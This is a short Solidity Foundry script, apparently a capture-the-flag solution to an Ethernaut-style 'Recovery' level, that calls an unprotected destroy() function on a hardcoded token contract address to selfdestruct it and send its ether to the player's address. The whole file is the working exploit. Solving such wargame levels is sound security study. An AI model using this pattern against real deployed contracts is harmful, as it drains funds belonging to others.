// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {SimpleToken} from "../src/17_Recovery.sol";

contract RecoveryAttack is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
  address player = vm.envAddress("USER");
  address simpleToken = 0xD32cB3BFbEA65289bEb22A126F053162909119A3;

  function run() external {
    SimpleToken token = SimpleToken(payable(simpleToken));
    vm.startBroadcast(deployerPrivateKey);
    console.log("Eth balance before: %d", player.balance);
    token.destroy(payable(player));
    console.log("Eth balance after: %d", player.balance);
    vm.stopBroadcast();
  }

}